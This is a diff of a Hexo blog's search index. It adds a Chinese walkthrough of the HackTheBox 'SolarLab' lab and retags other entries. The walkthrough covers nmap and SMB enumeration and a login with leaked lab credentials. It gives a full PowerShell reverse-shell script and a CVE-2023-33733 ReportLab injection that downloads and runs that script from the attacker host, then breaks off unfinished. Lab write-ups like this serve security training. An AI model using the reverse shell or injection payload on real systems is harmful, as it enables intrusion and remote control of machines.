@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>HTB-SolarLab</title>
+      <link href="/posts/76f3047a.html"/>
+      <url>/posts/76f3047a.html</url>
+      
+        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.11.16</p><p>攻击机ip：10.10.16.4</p></blockquote><h1>知识点</h1><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.16</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 17:41 CST</span><br><span class="line">Nmap scan report for 10.10.11.16</span><br><span class="line">Host is up (0.62s latency).</span><br><span class="line">Not shown: 65529 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">|_http-title: Did not follow redirect to http://solarlab.htb/</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">6791/tcp open  http          nginx 1.24.0</span><br><span class="line">|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">7680/tcp open  pando-pub?</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-01T09:43:17</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   683.75 ms 10.10.16.1</span><br><span class="line">2   684.69 ms 10.10.11.16</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 159.69 seconds</span><br></pre></td></tr></table></figure><p>将<code>solarlab.htb</code>和<code>report.solarlab.htb</code>添加到<code>/etc/passwd</code></p><h2 id="SMB">SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.11.16</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101180106976-1334623039.png" alt="image-20241101180058848"></p><p>发现有个<code>Documents</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.16/Documents</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101181258430-924059086.png" alt="image-20241101181249720"></p><p>把<code>xlsx</code>和<code>docx</code>文件下载下来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101181934739-1244580109.png" alt="image-20241101181926632"></p><p>在<code>details-file.xlsx</code>中找到一些用户的信息</p><p>将密码保存至passwd文件中</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101182121512-1137697727.png" alt="image-20241101182109656"></p><p>扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://solarlab.htb/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101183945600-1764411264.png" alt="image-20241101183936727"></p><p>并没有什么有价值的信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101184601356-1222616448.png" alt="image-20241101184552657"></p><p>但是在主页找到三个用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Alexander Knight</span><br><span class="line">Claudia Springer</span><br><span class="line">Blake Byte </span><br></pre></td></tr></table></figure><h2 id="6791端口">6791端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101184130104-891244871.png" alt="image-20241101184121541"></p><p>是一个登录页面，拿之前得到的用户名密码试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101190104834-965940237.png" alt="image-20241101190056813"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101190122123-836269660.png" alt="image-20241101190114391"></p><p>注意到有两种报错显示，一个是用户名不存在还有一个是身份验证错误，可以根据这个判断存在的用户名</p><p>结合之前的用户名以及测试结果发现，当出现身份验证错误的用户名格式是前面的名字加后面的首字母大写，所以尝试一下<code>BlakeB:ThisCanB3typedeasily1@</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101194443242-368108338.png" alt="image-20241101194434746"></p><p>成功登录！</p><h1>CVE-2023-33733实现RCE</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101194944539-1821286820.png" alt="image-20241101194936211"></p><p>像是生成pdf的网站，测试后发现其他三个功能都差不多</p><p>去<code>google</code>搜索<code>ReportHub</code>相关漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101195938939-1755768036.png" alt="image-20241101195930439"></p><p>最终找到个<a href="https://github.com/c53elyas/CVE-2023-33733/tree/master">CVE-2023-33733</a></p><p>将其下载到本地利用</p><p>先准备个<code>shell.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.ps1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.4&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br></pre></td></tr></table></figure><p>修改<code>poc.py</code>文件中的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;para&gt;</span><br><span class="line">             &lt;font color=<span class="string">&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;</span>&gt;</span><br><span class="line">               exploit</span><br><span class="line">               &lt;/font&gt;</span><br><span class="line">           &lt;/para&gt;</span><br></pre></td></tr></table></figure><p>将修改好的内容写进网站并执行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241101203446543-206493448.png" alt="image-20241101203438066"></p><p>显示超出字符限制，只能采用其他方法</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> HackTheBox </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTB </tag>
+            
+            <tag> Windows </tag>
+            
+            <tag> Active Directory </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HTB-Freelancer</title>
       <link href="/posts/1bc19c16.html"/>
       <url>/posts/1bc19c16.html</url>
@@ -15,8 +44,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -25,6 +52,8 @@
             <tag> HTB </tag>
             
             <tag> Windows </tag>
+            
+            <tag> Active Directory </tag>
             
         </tags>
       
@@ -71,8 +100,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -102,8 +129,6 @@
           
           <category> TryHackMe </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -112,6 +137,8 @@
             <tag> Windows </tag>
             
             <tag> THM </tag>
+            
+            <tag> Active Directory </tag>
             
         </tags>
       
@@ -131,8 +158,6 @@
           
           <category> TryHackMe </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -141,6 +166,8 @@
             <tag> Windows </tag>
             
             <tag> THM </tag>
+            
+            <tag> Active Directory </tag>
             
         </tags>
       
@@ -594,8 +621,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -624,8 +649,6 @@
       <categories>
           
           <category> HackTheBox </category>
-          
-          <category> Active Directory </category>
           
       </categories>
       
@@ -656,8 +679,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -686,8 +707,6 @@
       <categories>
           
           <category> HackTheBox </category>
-          
-          <category> Active Directory </category>
           
       </categories>
       
@@ -718,8 +737,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -748,8 +765,6 @@
       <categories>
           
           <category> HackTheBox </category>
-          
-          <category> Active Directory </category>
           
       </categories>
       
@@ -780,8 +795,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -810,8 +823,6 @@
       <categories>
           
           <category> HackTheBox </category>
-          
-          <category> Active Directory </category>
           
       </categories>
       
@@ -842,8 +853,6 @@
           
           <category> HackTheBox </category>
           
-          <category> Active Directory </category>
-          
       </categories>
       
       
@@ -854,35 +863,6 @@
             <tag> Windows </tag>
             
             <tag> Active Directory 101 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Java内存马之tomcat内存马</title>
-      <link href="/posts/bc31a7db.html"/>
-      <url>/posts/bc31a7db.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> Java </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> Tomcat </tag>
-            
-            <tag> 内存马 </tag>
             
         </tags>
       
@@ -937,139 +917,6 @@
             <tag> CTF </tag>
             
             <tag> Competition </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Log4j2</title>
-      <link href="/posts/6cdb73.html"/>
-      <url>/posts/6cdb73.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2e7fae38d107ee4625e24d45b2f0e491c74a88e07b7ffccd561ec03c5375bc90">fe693106a95ef61794da4c5f123204e8d3c00f148706c6a206ff03754bd2b2aa9d815501f8412c47ad5b63048142b7d09da07c934a6c60afb063b71ef21c63d3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> 漏洞复现 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Java反序列化之Fastjson</title>
-      <link href="/posts/a8f06b6c.html"/>
-      <url>/posts/a8f06b6c.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> Java </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> Fastjson </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Java反序列化之Shiro</title>
-      <link href="/posts/58285500.html"/>
-      <url>/posts/58285500.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> Java </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> Shiro </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Java反序列化之CC链</title>
-      <link href="/posts/fba70aa7.html"/>
-      <url>/posts/fba70aa7.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> Java </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
-            
-            <tag> CC链 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Java安全基础</title>
-      <link href="/posts/6f0aa025.html"/>
-      <url>/posts/6f0aa025.html</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="364a40a0dcc1cae62f3e7364796ee6d8363ffc4064d5c14d4fd521132bdb4ec8">a7ae39568c02d7a175b7104c21717a1155a916598a2595d06e26149fdf2fe6bd9bf81602d4d72ad068e3f75f7d2db656590adc2e1ef9e578d91ec408e035e573</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> Java反序列化 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Java </tag>
             
         </tags>
       
